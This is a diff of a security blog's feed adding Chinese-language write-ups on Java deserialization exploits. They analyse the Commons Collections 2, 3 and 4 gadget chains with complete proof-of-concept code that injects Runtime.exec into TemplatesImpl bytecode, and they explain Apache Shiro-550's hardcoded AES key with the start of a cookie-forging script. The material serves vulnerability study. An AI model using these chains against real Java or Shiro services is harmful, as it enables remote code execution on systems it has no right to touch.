+        return ois.readObject();
+    }
+}
+
+</code></pre>
+<h2 id="参考材料">参考材料</h2>
+<p>https://www.anquanke.com/post/id/233393#h2-7<br>
+http://myblog.ac.cn/archives/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcommoncollections4%E5%88%A9%E7%94%A8%E9%93%BE<br>
+https://blog.weik1.top/2021/03/02/CommonCollections2-7%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%88%86%E6%9E%90/#CommonCollections4</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[【Java反序列化】CommonCollections3利用链]]></title>
+        <id>https://limpid94.github.io/post/java-fan-xu-lie-hua-commoncollections3-li-yong-lian/</id>
+        <link href="https://limpid94.github.io/post/java-fan-xu-lie-hua-commoncollections3-li-yong-lian/">
+        </link>
+        <updated>2022-04-03T07:16:28.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="调用链">调用链</h2>
+<pre><code> ObjectInputStream.readObject()
+    AnnotationInvocationHandler.readObject()
+        Map(Proxy).entrySet()
+            AnnotationInvocationHandler.invoke()
+                LazyMap.get()
+                    ChainedTransformer.transform()
+                        ConstantTransformer.transform()
+                        InstantiateTransformer.transform()
+                            new TrAXFilter()
+                                TemplatesImpl.newInstance()
+                                    ... template gadge
+</code></pre>
+<h2 id="与cc2的区别">与CC2的区别</h2>
+<p>CC2使用的<code>PriorityQueue</code>作为序列化的入口，并且用的是<code>InvokerTransformer+TransformingComparator</code>作为链接命令执行的中间桥梁。<br>
+而CC3中间连接命令采用<code>TrAXFilter+ChainedTransformer+InstantiateTransformer</code>，入口点和CC1的相似。</p>
+<h2 id="利用链分析">利用链分析</h2>
+<p><code>TemplatesImpl.newInstance()</code>往下到加载恶意类的方法同CC2，不再赘诉。在调用<code>newTransformer()</code>方面，CC3引入<code>com.sun.org.apache.xalan.internal.xsltc.trax</code>的<code>TrAXFilter</code>类。<br>
+该类的构造方法中调用了<code>TransformerImpl</code>的<code>newTransformer()</code></p>
+<pre><code class="language-java">    public TrAXFilter(Templates templates)  throws
+        TransformerConfigurationException
+    {
+        _templates = templates;
+        _transformer = (TransformerImpl) templates.newTransformer();
+        _transformerHandler = new TransformerHandlerImpl(_transformer);
+        _useServicesMechanism = _transformer.useServicesMechnism();
+    }
+</code></pre>
+<p>由于<code>TrAXFilter</code>类没有继承序列化接口，因此无法完成序列化操作。此时可以回想CC1在面对Runtime类无法序列化的解决办法，可以利通过<code>ConstantTransformer</code>类的<code>transform</code>方法获取一个对象类型然后再反射调用即可。但是这里为了在某些场景下突破对InvokerTransformer的限制，采用了一个类似的类—— InstantiateTransformer类.<br>
+InstantiateTransformer类的构造方法传入要反射调用的方法的参数类型和参数值：</p>
+<pre><code class="language-java">    public InstantiateTransformer(Class[] paramTypes, Object[] args) {
+        super();
+        iParamTypes = paramTypes;
+        iArgs = args;
+    }
+</code></pre>
+<p>随后在<code>transform()</code>中调用<code>getConstructor()</code>来调用我们希望调用的类的构造方法。</p>
+<pre><code class="language-java">    public Object transform(Object input) {
+        try {
+            if (input instanceof Class == false) {
+                throw new FunctorException(
+                    &quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;
+                        + (input == null ? &quot;null object&quot; : input.getClass().getName()));
+            }
+            Constructor con = ((Class) input).getConstructor(iParamTypes);
+            return con.newInstance(iArgs);
+
+        } catch (NoSuchMethodException ex) {
+                ......（无关代码省略）
+        }
+    }
+</code></pre>
+<p>最后再用<code>ChainedTransformer</code>将其串起来，得到如下代码：</p>
+<pre><code class="language-java">        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(TrAXFilter.class),
+                new InstantiateTransformer(
+                        new Class[]{Templates.class},
+                        new Object[]{templates}
+                )
+        };
+
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+</code></pre>
+<p>余下的部分同CC1的LazyMap部分，也不再赘诉。</p>
+<h2 id="poc">POC</h2>
+<pre><code class="language-java">package cc.commonscollections;
+
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.ClassClassPath;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtConstructor;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InstantiateTransformer;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.map.LazyMap;
+
+import javax.xml.transform.Templates;
+import java.io.*;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CommonCollections3 {
+    public static void main(String[] args) throws Exception {
+        //获取默认类池
+        ClassPool pool = ClassPool.getDefault();
+        //添加路径
+        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
+        //创建新类
+        CtClass evil = pool.makeClass(&quot;Evil&quot;);
+        //设置类名
+        evil.setName(&quot;MyEvil&quot;);
+        //设置要继承的类
+        evil.setSuperclass(pool.get(AbstractTranslet.class.getName()));
+        //创建空的构造函数
+        CtConstructor newconstructor = evil.makeClassInitializer();
+        //将字节码插入开头
+        newconstructor.insertBefore(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;);
+        evil.writeFile();
+
+        byte[] bytecode = evil.toBytecode();
+        byte[][] bytecodes = {bytecode};
+
+        TemplatesImpl templates = new TemplatesImpl();
+        Class templatesClass = templates.getClass();
+        Field nameField = templatesClass.getDeclaredField(&quot;_name&quot;);
+        nameField.setAccessible(true);
+        nameField.set(templates,&quot;aaa&quot;);
+
+        Field bytecodesField = templatesClass.getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodesField.setAccessible(true);
+        bytecodesField.set(templates,bytecodes);
+
+        Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;);
+        tfactoryField.setAccessible(true);
+        tfactoryField.set(templates,new TransformerFactoryImpl());
+
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(TrAXFilter.class),
+                new InstantiateTransformer(
+                        new Class[]{Templates.class},
+                        new Object[]{templates}
+                )
+        };
+
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+        HashMap innerMap = new HashMap();
+        Map outterMap = LazyMap.decorate(innerMap, chainedTransformer);
+
+        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
+        constructor.setAccessible(true);
+        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Override.class, outterMap);
+
+        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},  invocationHandler);
+
+        Object o = constructor.newInstance(Override.class, mapProxy);
+
+//        mySeriable(o);
+        myDeseriable();
+
+    }
+
+    public static void mySeriable(Object obj) throws IOException {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser3.bin&quot;));
+        oos.writeObject(obj);
+    }
+
+    public static Object myDeseriable() throws IOException, ClassNotFoundException {
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser3.bin&quot;));
+        return ois.readObject();
+    }
+}
+</code></pre>
+<h2 id="参考材料">参考材料</h2>
+<p>https://www.programminghunter.com/article/30702056451/<br>
+https://blog.weik1.top/2021/03/02/CommonCollections2-7%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%88%86%E6%9E%90/#CommonCollections3<br>
+https://www.anquanke.com/post/id/233393#h2-3<br>
+https://chenlvtang.top/2021/12/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC3/<br>
+https://paper.seebug.org/1656/#commons-collections3</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[【Java反序列化】CommonCollections2利用链]]></title>
+        <id>https://limpid94.github.io/post/java-fan-xu-lie-hua-commoncollections2-li-yong-lian/</id>
+        <link href="https://limpid94.github.io/post/java-fan-xu-lie-hua-commoncollections2-li-yong-lian/">
+        </link>
+        <updated>2022-03-29T08:10:21.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="相关知识点">相关知识点</h2>
+<h2 id="反序列化链分析">反序列化链分析</h2>
+<p>CC2的链条与CC1最关键的不同是CC2采用动态加载字节码的方式来达到代码执行的目的。<br>
+动态类加载最终会用到ClassLoader中的defineClass方法。通过对调用了ClassLoader中的几个重载的defineClass方法进行审计，发现<code>com/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java</code>中的<code>defineClass</code>方法，该方法不仅调用了<code>ClassLoader#defineClass</code>并且没有指定作用域:</p>
+<pre><code class="language-java">Class defineClass(final byte[] b) {
+      return defineClass(null, b, 0, b.length);
+}
+</code></pre>
+<p>对其查找用法，发现在<code>getTransletInstance</code>方法中有调用</p>
+<pre><code class="language-java">    private Translet getTransletInstance()
+        throws TransformerConfigurationException {
+        try {
+            if (_name == null) return null;
+
+            if (_class == null) defineTransletClasses();
+
+            // The translet needs to keep a reference to all its auxiliary
+            // class to prevent the GC from collecting them
+            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
+            translet.postInitialization();
+            translet.setTemplates(this);
+            translet.setServicesMechnism(_useServicesMechanism);
+            translet.setAllowedProtocols(_accessExternalStylesheet);
+            if (_auxClasses != null) {
+                translet.setAuxiliaryClasses(_auxClasses);
+            }
+
+            return translet;
+        }
+        catch (InstantiationException e) {
+            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
+            throw new TransformerConfigurationException(err.toString());
+        }
+        catch (IllegalAccessException e) {
+            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
+            throw new TransformerConfigurationException(err.toString());
+        }
+    }
+</code></pre>
+<p>在该方法中为了触发<code>defineTransletClasses</code>方法需要满足两个条件<code>_name</code>不能为空、并且<code>_class</code>为空。再追入<code>defineTransletClasses</code>方法</p>
+<pre><code class="language-java">    private void defineTransletClasses()
+        throws TransformerConfigurationException {
+
+        if (_bytecodes == null) {
+            ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
+            throw new TransformerConfigurationException(err.toString());
+        }
+
+        TransletClassLoader loader = (TransletClassLoader)
+            AccessController.doPrivileged(new PrivilegedAction() {
+                public Object run() {
+                    return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
+                }
+            });
+
+        try {
+            final int classCount = _bytecodes.length;
+            _class = new Class[classCount];
+
+            if (classCount &gt; 1) {
+                _auxClasses = new HashMap&lt;&gt;();
+            }
+
+            for (int i = 0; i &lt; classCount; i++) {
+                _class[i] = loader.defineClass(_bytecodes[i]);
+                final Class superClass = _class[i].getSuperclass();
+
+                // Check if this is the main class
+                if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
+                    _transletIndex = i;
+                }
+                else {
+                    _auxClasses.put(_class[i].getName(), _class[i]);
+                }
+            }
+
+            if (_transletIndex &lt; 0) {
+                ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);
+                throw new TransformerConfigurationException(err.toString());
+            }
+        }
+        catch (ClassFormatError e) {
+            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);
+            throw new TransformerConfigurationException(err.toString());
+        }
+        catch (LinkageError e) {
+            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
+            throw new TransformerConfigurationException(err.toString());
+        }
+    }
+</code></pre>
+<p>从代码可以看到<code>_bytecodes</code>不能为空，否则报错。若其不为空则实例化<code>TransletClassLoader</code>并返回。这其中需要传入<code>_tfactory.getExternalExtensionsMap()</code>因此不能为空。查看其具体类型：<br>
+<img src="https://limpid94.github.io/post-images/1648627660697.png" alt="" loading="lazy"><br>
+值得注意的是<code>_tfactory</code>被<code>transient</code>修饰，即序列化时不带上该值，因此反序列化时从反序列化数据中读不到。继续查找，发现再readObject方法中进行初始化：<br>
+<img src="https://limpid94.github.io/post-images/1648628430347.png" alt="" loading="lazy"><br>
+因此构造EXP时直接用反射修改其内容即可。</p>
+<pre><code class="language-java">        Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;);
+        tfactoryField.setAccessible(true);
+        tfactoryField.set(templates,new TransformerFactoryImpl());
+</code></pre>
+<p>以上代码完成了类加载并执行代码的功能，接下来需要知道如何将反序列化的入口点和命令执行的点链接起来。<br>
+这里依旧是用<code>InvokerTransformer#transform</code>方法来反射调用。</p>
+<pre><code class="language-java">InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;newTransformer&quot;, new Class[]{}, new Object[]{});
+</code></pre>
+<p>然后谁来调用<code>InvokerTransformer</code>的<code>transform</code>呢？CC1使用了<code>ChainedTransformer</code>来调用。而CC2则是用<code>TransformingComparator</code>来调用<code>transform</code>。应为在其<code>compare</code>方法中调用了<code>transform</code>方法：</p>
+<pre><code class="language-java">    /**
+     * Returns the result of comparing the values from the transform operation.
+     * 
+     * @param obj1  the first object to transform then compare
+     * @param obj2  the second object to transform then compare
+     * @return negative if obj1 is less, positive if greater, zero if equal
+     */
+    public int compare(Object obj1, Object obj2) {
+        Object value1 = this.transformer.transform(obj1);
+        Object value2 = this.transformer.transform(obj2);
+        return this.decorated.compare(value1, value2);
+    }
+</code></pre>
+<p>而<code>transformer</code>可控，会在构造方法中赋值：</p>
+<pre><code class="language-java">    public TransformingComparator(Transformer transformer, Comparator decorated) {
+        this.decorated = decorated;
+        this.transformer = transformer;
+    }
+</code></pre>
+<h3 id="priorityqueue">PriorityQueue</h3>
+<p>为了能够调用<code>compare</code>方法，Ysoserial给出了PriorityQueue类。</p>
+<blockquote>
+<p>PriorityQueue（优先队列），和普通的queue的差别就在于，它不是简单的先进先出，它的每个元素都有一个自己的“优先级”。每次出列的时候，不再是最先进的先出，而是优先级最高的先出。</p>
+</blockquote>
+<p>通过搜素关键字<code>compare</code>得知一共有2个方法调用到——<code>siftUpUsingComparator()</code>和<code>siftDownUsingComparator()</code>。<br>
+之所以使用<code>siftDownUsingComparator()</code>是因为其被<code>siftDown()</code>所调用：</p>
+<pre><code class="language-java">    private void siftDown(int k, E x) {
+        if (comparator != null)
+            siftDownUsingComparator(k, x);
+        else
+            siftDownComparable(k, x);
+    }
+</code></pre>
+<p>而<code>siftDown()</code>被<code>heapify()</code>调用，后者直接被<code>readObject()</code>调用：</p>
+<pre><code class="language-java">    private void readObject(java.io.ObjectInputStream s)
+        throws java.io.IOException, ClassNotFoundException {
+        // Read in size, and any hidden stuff
+        s.defaultReadObject();
+
+        // Read in (and discard) array length
+        s.readInt();
+
+        queue = new Object[size];
+
+        // Read in all elements.
+        for (int i = 0; i &lt; size; i++)
+            queue[i] = s.readObject();
+
+        // Elements are guaranteed to be in &quot;proper order&quot;, but the
+        // spec has never explained what that might be.
+        heapify();
+    }
+</code></pre>
+<p>在<code>siftDown()</code>中为了能进入<code>siftDownUsingComparator</code>分支，需要让<code>comparator</code>不为空。在该类中查找发现<code>comparator</code>在构造函数中赋值：</p>
+<pre><code class="language-java">    public PriorityQueue(Comparator&lt;? super E&gt; comparator) {
+        this(DEFAULT_INITIAL_CAPACITY, comparator);
+    }
+    ...
+
+    public PriorityQueue(int initialCapacity,
+                         Comparator&lt;? super E&gt; comparator) {
+        // Note: This restriction of at least one is not actually needed,
+        // but continues for 1.5 compatibility
+        if (initialCapacity &lt; 1)
+            throw new IllegalArgumentException();
+        this.queue = new Object[initialCapacity];
+        this.comparator = comparator;
+    }    
+</code></pre>
+<p>因此在初始化的时候可以传入TransformingComparator，同时为了触发比较，还要满足<code>for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)</code>因此需要添加2个元素进去。</p>
+<pre><code class="language-java">        PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);
+        priorityQueue.add(templates);
+        priorityQueue.add(2);
+</code></pre>
+<p>为了避免其在序列化时就产生命令执行，这里需要给<code>TransformingComparator</code>先初始化成其他的类，比如<code>new ConstantTransformer(1)</code>，然后再用反射去获取<code>transformer</code>的值然后修改成<code>invokerTransformer</code>。</p>
+<pre><code class="language-java">        Field tField = transformingComparator.getClass().getDeclaredField(&quot;transformer&quot;);
+        tField.setAccessible(true);
+        tField.set(transformingComparator,invokerTransformer);
+</code></pre>
+<h2 id="poc">POC</h2>
+<pre><code class="language-java">package cc.commonscollections;
+
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.*;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+
+import javax.xml.transform.TransformerConfigurationException;
+import java.io.*;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+import java.util.Comparator;
+import java.util.PriorityQueue;
+
+public class CommonCollections2 {
+    public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException, NoSuchFieldException, TransformerConfigurationException {
+        //构造.class字节流程
+        //获取默认类池
+        ClassPool pool = ClassPool.getDefault();
+        //添加路径
+        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
+        //创建新类
+        CtClass evil = pool.makeClass(&quot;Evil&quot;);
+        //设置类名
+        evil.setName(&quot;MyEvil&quot;);
+        //设置要继承的类
+        evil.setSuperclass(pool.get(AbstractTranslet.class.getName()));
+        //创建空的构造函数
+        CtConstructor newconstructor = evil.makeClassInitializer();
+        //将字节码插入开头
+        newconstructor.insertBefore(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;);
+        evil.writeFile();
+
+        byte[] bytecode = evil.toBytecode();
+        byte[][] bytecodes = {bytecode};
+//        Class&lt;?&gt; clas = Class.forName(&quot;java.lang.ClassLoader&quot;);
+//        Method defineClass = clas.getDeclaredMethod(&quot;defineClass&quot;, String.class, Byte[].class, int.class, int.class);
+//        defineClass.setAccessible(true);
+//        Class clz = (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), &quot;Evil&quot;, bytecode, 0, bytecode.length);
+//        clz.newInstance();
+        //实例化TemplatesImpl
+        TemplatesImpl templates = new TemplatesImpl();
+        Class templatesClass = templates.getClass();
+        Field nameField = templatesClass.getDeclaredField(&quot;_name&quot;);
+        nameField.setAccessible(true);
+        nameField.set(templates,&quot;aaa&quot;);
+
+        Field bytecodesField = templatesClass.getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodesField.setAccessible(true);
+        bytecodesField.set(templates,bytecodes);
+
+        Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;);
+        tfactoryField.setAccessible(true);
+        tfactoryField.set(templates,new TransformerFactoryImpl());
+
+        //使用InvokerTransformer。
+        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;newTransformer&quot;, new Class[]{}, new Object[]{});
+//        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));
+        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));
+
+        PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);
+        priorityQueue.add(templates);
+        priorityQueue.add(2);
+
+        Field tField = transformingComparator.getClass().getDeclaredField(&quot;transformer&quot;);
+        tField.setAccessible(true);
+        tField.set(transformingComparator,invokerTransformer);
+
+       mySeriable(priorityQueue);
+        myDeseriable(&quot;sercc2.bin&quot;);
+    }
+    public static void mySeriable(Object obj) throws IOException {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;sercc2.bin&quot;));
+        oos.writeObject(obj);
+        oos.close();
+    }
+
+    public static Object myDeseriable(String s) throws IOException, ClassNotFoundException {
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(s));
+        return ois.readObject();
+    }
+
+}
+
+</code></pre>
+<h2 id="参考资料">参考资料</h2>
+<p>https://www.anquanke.com/post/id/232592#h3-13<br>
+https://www.cnblogs.com/depycode/p/13583102.html<br>
+https://blog.csdn.net/rfrder/article/details/119962850</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[【Java反序列化】Shiro 550 反序列化漏洞原理]]></title>
+        <id>https://limpid94.github.io/post/java-fan-xu-lie-hua-shiro-550-fan-xu-lie-hua-lou-dong-yuan-li/</id>
+        <link href="https://limpid94.github.io/post/java-fan-xu-lie-hua-shiro-550-fan-xu-lie-hua-lou-dong-yuan-li/">
+        </link>
+        <updated>2022-03-14T06:57:00.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="原理分析">原理分析：</h2>
+<p>从CVE的描述得知是反序列化漏洞，因此定位readObject()方法。<br>
+定位到<code>core/src/main/java/org/apache/shiro/io/DefaultSerializer.java</code>方法</p>
+<pre><code class="language-java">    public T deserialize(byte[] serialized) throws SerializationException {
+        if (serialized == null) {
+            String msg = &quot;argument cannot be null.&quot;;
+            throw new IllegalArgumentException(msg);
+        }
+        ByteArrayInputStream bais = new ByteArrayInputStream(serialized);
+        BufferedInputStream bis = new BufferedInputStream(bais);
+        try {
+            ObjectInputStream ois = new ClassResolvingObjectInputStream(bis);
+            @SuppressWarnings({&quot;unchecked&quot;})
+            T deserialized = (T) ois.readObject();
+            ois.close();
+            return deserialized;
+        } catch (Exception e) {
+            String msg = &quot;Unable to deserialze argument byte array.&quot;;
+            throw new SerializationException(msg, e);
+        }
+    }
+</code></pre>
+<p>其中<code>T deserialized = (T) ois.readObject();</code>是反序列化的入口点。通过查找其调用点可以找到在<code>core/src/main/java/org/apache/shiro/mgt/AbstractRememberMeManager.java</code>中被调用<br>
+<img src="https://limpid94.github.io/post-images/1647320425187.png" alt="" loading="lazy"></p>
+<pre><code class="language-java">    protected PrincipalCollection deserialize(byte[] serializedIdentity) {
+        return getSerializer().deserialize(serializedIdentity);
+    }
+</code></pre>
+<p>同样在<code>AbstractRememberMeManager</code>类中的<code>convertBytesToPrincipals</code>方法调用了<code>deserialize</code>。</p>
+<pre><code class="language-java">    protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) {
+        if (getCipherService() != null) {
+            bytes = decrypt(bytes);
+        }
+        return deserialize(bytes);
+    }
+</code></pre>
+<p>而<code>convertBytesToPrincipals</code>又被<code>AbstractRememberMeManager#getRememberedPrincipals</code>所调用。<br>
+再往上查找调用者，得到<code>core/src/main/java/org/apache/shiro/mgt/DefaultSecurityManager.java</code>的<code>getRememberedIdentity</code>。继续查找该方法的调用者，发现在同类中的<code>resolvePrincipals</code>方法中被调用，而同类的<code>createSubject</code>方法又调用了<code>resolvePrincipals</code>方法。</p>
+<pre><code class="language-java">    public Subject createSubject(SubjectContext subjectContext) {
+        //create a copy so we don't modify the argument's backing map:
+        SubjectContext context = copy(subjectContext);
+
+        //ensure that the context has a SecurityManager instance, and if not, add one:
+        context = ensureSecurityManager(context);
+
+        //Resolve an associated Session (usually based on a referenced session ID), and place it in the context before
+        //sending to the SubjectFactory.  The SubjectFactory should not need to know how to acquire sessions as the
+        //process is often environment specific - better to shield the SF from these details:
+        context = resolveSession(context);
+
+        //Similarly, the SubjectFactory should not require any concept of RememberMe - translate that here first
+        //if possible before handing off to the SubjectFactory:
+        context = resolvePrincipals(context);
+
+        Subject subject = doCreateSubject(context);
+
+        //save this subject for future reference if necessary:
+        //(this is needed here in case rememberMe principals were resolved and they need to be stored in the
+        //session, so we don't constantly rehydrate the rememberMe PrincipalCollection on every operation).
+        //Added in 1.2:
+        save(subject);
+
+        return subject;
+    }
+</code></pre>
+<p>而该<code>createSubjectcreateSubject(SubjectContext subjectContext)</code>又被<code>core/src/main/java/org/apache/shiro/subject/Subject.java</code>接口的<code>buildSubject</code>调用。<br>
+经过查找后发现<code>WebSubject</code>接口继承了<code>Subject</code>并且<code>buildWebSubject</code>调用了<code>buildSubject</code>。而<code>web/src/main/java/org/apache/shiro/web/servlet/AbstractShiroFilter.java</code>调用了<code>createSubject</code>方法：</p>
+<pre><code class="language-java">    protected WebSubject createSubject(ServletRequest request, ServletResponse response) {
+        return new WebSubject.Builder(getSecurityManager(), request, response). buildWebSubject();
+    }
+</code></pre>
+<p>整个过程好像没有和Cookie相关的方法，于是我简单了解Shiro框架的鉴权流程，<br>
+<img src="https://limpid94.github.io/post-images/1647502515479.png" alt="" loading="lazy"><br>
+而网上其他大牛的文章都提到了<code>CookieRememberMeManager</code>类，为了进一步检查我之前在反追流程时是否遗漏哪个地方，于是动态调试源码。<br>
+<img src="https://limpid94.github.io/post-images/1647849776539.png" alt="" loading="lazy"><br>
+得知在<code>AbstractRememberMeManager#getRememberedPrincipals</code>下调用了<code>CookieRememberMeManager#getRememberedSerializedIdentity</code><br>
+<img src="https://limpid94.github.io/post-images/1647858930182.png" alt="" loading="lazy"></p>
+<pre><code class="language-JAVA">       protected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) {
+
+        if (!WebUtils.isHttp(subjectContext)) {
+            if (log.isDebugEnabled()) {
+                String msg = &quot;SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a &quot; +
+                        &quot;servlet request and response in order to retrieve the rememberMe cookie. Returning &quot; +
+                        &quot;immediately and ignoring rememberMe operation.&quot;;
+                log.debug(msg);
+            }
             return null;
         }
 
-        @Override
-        protected synchronized InetAddress getHostAddress(URL u) {
+        WebSubjectContext wsc = (WebSubjectContext) subjectContext;
+        if (isIdentityRemoved(wsc)) {
+            return null;
+        }
+
+        HttpServletRequest request = WebUtils.getHttpRequest(wsc);
+        HttpServletResponse response = WebUtils.getHttpResponse(wsc);
+
+        String base64 = getCookie().readValue(request, response);
+        // Browsers do not always remove cookies immediately (SHIRO-183)
+        // ignore cookies that are scheduled for removal
+        if (Cookie.DELETED_COOKIE_VALUE.equals(base64)) return null;
+
+        if (base64 != null) {
+            base64 = ensurePadding(base64);
+            if (log.isTraceEnabled()) {
+                log.trace(&quot;Acquired Base64 encoded identity [&quot; + base64 + &quot;]&quot;);
+            }
+            byte[] decoded = Base64.decode(base64); # 对Cookie进行解密操作
+            if (log.isTraceEnabled()) {
+                log.trace(&quot;Base64 decoded byte array length: &quot; + (decoded != null ? decoded.length : 0) + &quot; bytes.&quot;);
+            }
+            return decoded;
+        } else {
+            //no cookie set - new site visitor?
             return null;
         }
     }
-
 </code></pre>
-<p>然后修改main方法中的部分代码：</p>
-<pre><code class="language-java">    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
-        HashMap&lt;URL,Integer&gt; hashmap = new HashMap&lt;&gt;();
-        URLStreamHandler handler = new MyURLStreamHandler();
-        URL u = new URL( null,&quot;http://99efe118.dns.1433.eu.org&quot;, handler);
-        hashmap.put(u,123);
+<p>该方法会对Cookie进行判断是否为Base64字符串，若是则进行解码操作并且返回给<code>AbstractRememberMeManager#getRememberedPrincipals</code>然后再用<code>decrypt</code>方法<br>
+对AES进行解密。<br>
+而AES的密钥是写死的：<br>
+<img src="https://limpid94.github.io/post-images/1647934371819.png" alt="" loading="lazy"><br>
+因此可以先构造一个恶意的序列化数据，然后用AES加密后用Base64加密</p>
+<h2 id="exp构造">EXP构造</h2>
+<p>首先以URLDNS为例：<br>
+通过动态调试得知AES加密方式是：AES/CBC/PKCS5padding<br>
+首先构造URLDNS的序列化数据</p>
+<pre><code class="language-java">package cc.commonscollections;
 
-        Field field = URL.class.getDeclaredField(&quot;hashCode&quot;);
-        field.setAccessible(true);
-        field.set(u,-1);
-
-        serialize(hashmap);
-</code></pre>
-<p>此时序列化时就不会产生DNS查询。<br>
-当执行反序列化时，就会产生DNS查询，达到目的</p>
-<pre><code class="language-java">import java.io.*;
+import java.io.*;
 import java.lang.reflect.Field;
 import java.net.InetAddress;
 import java.net.URL;
@@ -445,984 +1658,329 @@ public class MyURLDNS {
 }
 
 </code></pre>
-<figure data-type="image" tabindex="2"><img src="https://limpid94.github.io/post-images/1644395901500.PNG" alt="" loading="lazy"></figure>
-<h2 id="参考材料">参考材料</h2>
-<p>《Java反序列化漏洞学习 Commons Collection》https://tttang.com/archive/1337/<br>
-《深入了解序列化writeObject、readObject、readResolve》https://blog.csdn.net/Leon_cx/article/details/81517603<br>
-《URLDNS利用链分析》https://johnfrod.top/%E5%AE%89%E5%85%A8/urldns%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</p>
+<p>之后用python编写即可</p>
+<pre><code class="language-python">from Crypto.Cipher import AES
+from base64 import b64decode, b64encode
+
+BLOCK_SIZE = AES.block_size
+# 不足BLOCK_SIZE的补位(s可能是含中文，而中文字符utf-8编码占3个位置,gbk是2，所以需要以len(s.encode())，而不是len(s)计算补码)
+pad = lambda s: s + (BLOCK_SIZE - len(s.encode()) % BLOCK_SIZE) * chr(BLOCK_SIZE - len(s.encode()) % BLOCK_SIZE)
+# 去除补位
+unpad = lambda s: s[:-ord(s[len(s) - 1:])]
+
+
+class AESCipher:
+    def __init__(self, secretkey: str):
+        self.key = secretkey  # 密钥
+        self.iv = secretkey[0:16]  # 偏移量
+
+    def encrypt(self, text):
+        &quot;&quot;&quot;
+        加密 ：先补位，再AES加密，后base64编码
+        :param text: 需加密的明文
+        :return:
+        &quot;&quot;&quot;
